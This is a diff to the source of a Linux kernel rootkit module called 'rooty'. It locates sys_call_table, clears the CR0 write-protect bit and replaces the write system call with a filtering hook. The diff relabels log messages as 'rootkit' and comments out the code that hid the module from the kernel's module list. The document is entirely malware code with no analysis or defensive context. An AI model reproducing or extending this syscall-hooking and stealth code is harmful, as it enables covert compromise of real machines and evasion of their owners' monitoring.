@@ -42,7 +42,7 @@ psize **find(void) {
 
 asmlinkage ssize_t rooty_write(int fd, const char __user *buff, ssize_t count) {
  int r;
- char *proc_protect = ".rooty";
+ char *proc_protect = ".rootkit";
  char *kbuff = (char *) kmalloc(256,GFP_KERNEL);
  copy_from_user(kbuff,buff,255);
  if (strstr(kbuff,proc_protect)) {
@@ -56,14 +56,14 @@ asmlinkage ssize_t rooty_write(int fd, const char __user *buff, ssize_t count) {
 
 int rooty_init(void) {
  /* Do kernel module hiding*/
- list_del_init(&__this_module.list);
- kobject_del(&THIS_MODULE->mkobj.kobj);
+ //list_del_init(&__this_module.list);
+ //kobject_del(&THIS_MODULE->mkobj.kobj);
  
  /* Find the sys_call_table address in kernel memory */
  if ((sys_call_table = (psize *) find())) {
-  printk("rooty: sys_call_table found at %p\n", sys_call_table);
+  printk("rootkit: sys_call_table found at %p\n", sys_call_table);
  } else {
-  printk("rooty: sys_call_table not found, aborting\n");
+  printk("rootkit: sys_call_table not found, aborting\n");
  }
  
  /* disable write protect on page in cr0 */
@@ -82,5 +82,5 @@ void rooty_exit(void) {
  write_cr0(read_cr0() & (~ 0x10000));
  xchg(&sys_call_table[__NR_write],o_write);
  write_cr0(read_cr0() | 0x10000);
- printk("rooty: Module unloaded\n");
+ printk("rootkit: Module unloaded\n");
 }
